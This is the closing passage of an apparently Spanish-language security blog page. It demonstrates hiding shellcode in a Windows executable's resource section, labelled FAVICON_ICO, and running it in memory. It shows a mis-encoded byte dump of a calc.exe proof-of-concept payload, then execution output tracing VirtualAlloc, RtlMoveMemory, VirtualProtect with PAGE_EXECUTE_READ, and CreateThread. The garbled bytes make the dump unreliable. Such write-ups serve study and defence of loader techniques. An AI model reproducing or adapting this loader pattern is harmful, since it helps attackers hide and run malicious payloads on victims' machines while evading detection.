class="n">o</span><span class="err">‚Ä°√ø√ï¬ª√∞¬µ¬¢</span><span class="n">VA</span><span class="err">¬∫¬¶‚Ä¢¬Ω¬ù√ø√ï</span><span class="n">H</span><span class="err">∆í√Ñ</span><span class="p">(</span><span class="o">&lt;</span><span class="err"></span><span class="o">|</span>
<span class="err">‚Ç¨√ª√†</span><span class="n">u</span><span class="err">¬ª</span><span class="n">G</span><span class="err"></span><span class="n">roj</span> <span class="n">YA</span><span class="err">‚Ä∞√ö√ø√ï</span><span class="n">calc</span><span class="p">.</span><span class="n">exe</span> 
</code></pre></div></div>
<p>Salida de la ejecuci√≥n:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Extract data from external resource FAVICON_ICO
 Extract data from external resource ` 
 Extract data from external resource ‚ÅøH√¢Œ£‚â°Œ¶‚îî
Sotred payload in .text section payload addr         : 0x00007FF69DF12060

 [VirtualAlloc] of new moemory region exec_mem addr        : 0x00000195C51A0000

 [RtlMoveMemory] copy data
 [VirtualProtect] Include execution and read privileges PAGE_EXECUTE_READ

 [CreateThread] Exec stored payload
</code></pre></div></div>

<p><img src="/assets/images/rsc_section_injection.png" alt="rsc_section_injection" /></p>

      </section>
    </div>
  </body>
</html>
